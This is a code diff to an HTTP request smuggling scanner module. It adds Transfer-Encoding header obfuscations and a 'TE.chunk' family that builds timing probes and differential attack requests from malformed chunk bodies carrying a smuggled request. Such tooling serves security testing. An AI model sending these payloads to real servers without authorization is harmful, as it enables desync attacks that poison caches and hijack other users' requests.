@@ -29,6 +29,7 @@ from dataclasses import dataclass, field
 __all__ = [
     "Technique",
     "TE_OBFUSCATIONS",
+    "CHUNK_BODY_VARIANTS",
     "all_techniques",
     "technique_by_name",
     "DESYNC_REFERENCES",
@@ -53,6 +54,37 @@ TE_OBFUSCATIONS: tuple[tuple[str, bytes], ...] = (
     ("x-prefixed", b"Transfer-Encoding: xchunked"),
     ("quoted-value", b'Transfer-Encoding: "chunked"'),
     ("leading-space-value", b"Transfer-Encoding:  chunked"),
+    # v0.4 parser-discrepancy additions: header-value level obfuscations.
+    # Strict parsers reject these; lenient parsers accept them as "chunked".
+    ("mixed-case", b"Transfer-Encoding: Chunked"),
+    ("null-byte", b"Transfer-Encoding: chunked\x00"),
+    ("bare-cr-end", b"Transfer-Encoding: chunked\r"),
+    ("ows-trailer", b"Transfer-Encoding: chunked "),
+    ("comma-chunk", b"Transfer-Encoding: ,chunked"),
+)
+
+# Chunk-body-level discrepancy variants for the TE.chunk technique family (v0.4).
+# Each entry is (name, timing_body, timing_cl, attack_prefix) where:
+#   timing_body  — the raw chunk body sent in the timing probe (after headers)
+#   timing_cl    — the Content-Length value in the timing probe; the front-end
+#                  (CL) forwards only this many bytes, leaving the back-end (TE)
+#                  with an incomplete or malformed chunk body to parse
+#   attack_prefix — bytes prepended to "0\r\n\r\n"+smuggled in the differential
+#                   attack; the prefix is the "data" chunk(s) that the lenient
+#                   back-end processes before hitting the terminator
+#
+# These probe the chunk-body level, not the TE header level: both sides see
+# Transfer-Encoding: chunked (plain), but they parse the chunk framing
+# differently. The front-end uses Content-Length regardless, so the discrepancy
+# only fires when the back-end attempts to parse the forwarded bytes as chunks.
+CHUNK_BODY_VARIANTS: tuple[tuple[str, bytes, int, bytes], ...] = (
+    # Chunk with a semicolon extension (RFC 7230 §4.1.1): lenient parsers
+    # strip the extension and read a 1-byte chunk; strict parsers see an
+    # invalid hex chunk-size token and cannot parse the body.
+    ("chunk-ext", b"1;x=p\r\nA\r\nX", 6, b"1;x=p\r\nA\r\n"),
+    # Bare CR (no LF) as chunk-line terminator: lenient parsers accept \r
+    # alone; strict parsers require \r\n and cannot find the chunk boundary.
+    ("bare-cr", b"1\rA\rX", 3, b"1\rA\r"),
 )
 
 _PLAIN_TE = b"Transfer-Encoding: chunked"
@@ -80,9 +112,20 @@ class Technique:
         name: The finding ``vector`` / discrepancy class (e.g. ``"CL.TE"``).
         discrepancy: The ``X.Y`` discrepancy label (mirrors ``name``).
         safe_order: Lower is probed earlier (CL.TE before TE.CL -- criterion 4).
-        variant: A specific mutator (the TE.TE obfuscation name), or ``None``.
+        variant: A specific mutator (the TE.TE obfuscation name, or the
+            ``TE.chunk`` chunk-body variant name), or ``None``.
         te_header: The raw Transfer-Encoding header bytes this technique uses
-            (obfuscated for TE.TE, plain for CL.TE/TE.CL).
+            (obfuscated for TE.TE, plain for CL.TE/TE.CL/TE.chunk).
+        timing_body: The raw chunk body appended after the headers in the
+            timing probe. Defaults to the standard ``1\\r\\nA\\r\\nX`` probe.
+        timing_cl: The Content-Length value in the timing probe; controls how
+            many bytes the front-end (CL) forwards to the back-end (TE).
+            Default (4) truncates at the end of the first chunk's data byte,
+            leaving the back-end's chunked parser incomplete -> hang.
+        attack_prefix: For ``TE.chunk`` only: bytes prepended to the
+            ``0\\r\\n\\r\\n``+smuggled differential attack body. The prefix is the
+            data chunk(s) that a lenient back-end processes before hitting the
+            terminating chunk.
     """
 
     name: str
@@ -91,6 +134,9 @@ class Technique:
     variant: str | None = None
     te_header: bytes = _PLAIN_TE
     references: tuple[str, ...] = field(default=DESYNC_REFERENCES)
+    timing_body: bytes = b"1\r\nA\r\nX"
+    timing_cl: int = 4
+    attack_prefix: bytes = b""
 
     # -- timing probes -----------------------------------------------------
 
@@ -100,18 +146,23 @@ class Technique:
         CL.0 and dup-CL have no reliable hang signature (the back-end reads a
         zero-length body and answers immediately); they are confirmed by the
         differential stage instead.
+
+        For ``TE.chunk`` techniques the front-end sends ``self.timing_cl`` bytes
+        (Content-Length), causing the back-end (TE) to attempt parsing
+        ``self.timing_body[:timing_cl]`` as a chunked body. A back-end that
+        cannot parse the chunk variant hangs or errors -- the timing signal.
         """
         kind = self.name
-        if kind in ("CL.TE", "TE.TE"):
-            # front uses Content-Length (4 => "1\r\nA"), back uses chunked and is
-            # left waiting for the next chunk -> hang.
+        if kind in ("CL.TE", "TE.TE", "TE.chunk"):
+            # front uses Content-Length (timing_cl bytes forwarded), back uses
+            # chunked and is left with an incomplete or malformed chunk -> hang.
             head = _crlf(
                 f"POST {path} HTTP/1.1".encode(),
                 f"Host: {host}".encode(),
-                b"Content-Length: 4",
+                f"Content-Length: {self.timing_cl}".encode(),
                 self.te_header,
             )
-            return head + b"1\r\nA\r\nX"
+            return head + self.timing_body
         if kind == "TE.CL":
             # front uses chunked (stops at "0\r\n\r\n"), back uses Content-Length
             # (6) and is left waiting for the 6th body byte -> hang.
@@ -181,13 +232,54 @@ class Technique:
             )
             return head + body
 
+        if kind == "TE.chunk":
+            # front (CL) forwards the entire body; back (chunked) processes the
+            # chunk variant in self.attack_prefix, then terminates at "0\r\n\r\n"
+            # (standard terminator), leaving the smuggled request as leftover.
+            # A lenient back-end that understands the chunk variant confirms the
+            # desync; a strict back-end that rejects it hangs (timing-only).
+            body = self.attack_prefix + b"0\r\n\r\n" + smuggled
+            head = _crlf(
+                f"POST {path} HTTP/1.1".encode(),
+                f"Host: {host}".encode(),
+                f"Content-Length: {len(body)}".encode(),
+                self.te_header,
+            )
+            return head + body
+
         raise ValueError(f"unknown technique {kind!r}")
 
 
+def chunk_body_techniques() -> list[Technique]:
+    """TE.chunk technique variants, one per entry in :data:`CHUNK_BODY_VARIANTS`.
+
+    Each variant uses a plain ``Transfer-Encoding: chunked`` header but sends a
+    non-standard chunk body in the timing probe and differential attack. The
+    discrepancy is at the chunk-body level, not the header level: both sides see
+    a valid chunked TE header, but they parse the chunk framing differently.
+    """
+    techs: list[Technique] = []
+    for name, t_body, t_cl, a_prefix in CHUNK_BODY_VARIANTS:
+        techs.append(
+            Technique(
+                "TE.chunk",
+                "TE.chunk",
+                safe_order=4,
+                variant=name,
+                te_header=_PLAIN_TE,
+                timing_body=t_body,
+                timing_cl=t_cl,
+                attack_prefix=a_prefix,
+            )
+        )
+    return techs
+
+
 def all_techniques() -> list[Technique]:
-    """Every v0.1 technique, in safe probe order (CL.TE first, TE.CL later).
+    """Every technique, in safe probe order (CL.TE first, TE.CL last).
 
     TE.TE expands to one technique per obfuscation in :data:`TE_OBFUSCATIONS`.
+    TE.chunk expands to one technique per variant in :data:`CHUNK_BODY_VARIANTS`.
     """
     techs: list[Technique] = [
         Technique("CL.TE", "CL.TE", safe_order=0),
@@ -199,6 +291,8 @@ def all_techniques() -> list[Technique]:
         techs.append(
             Technique("TE.TE", "TE.TE", safe_order=3, variant=variant, te_header=header)
         )
+    # TE.chunk chunk-body variants -- after TE.TE, before TE.CL.
+    techs.extend(chunk_body_techniques())
     # TE.CL last: its timing probe can hang a CL.TE target, so never before CL.TE.
     techs.append(Technique("TE.CL", "TE.CL", safe_order=9))
     return sorted(techs, key=lambda t: t.safe_order)
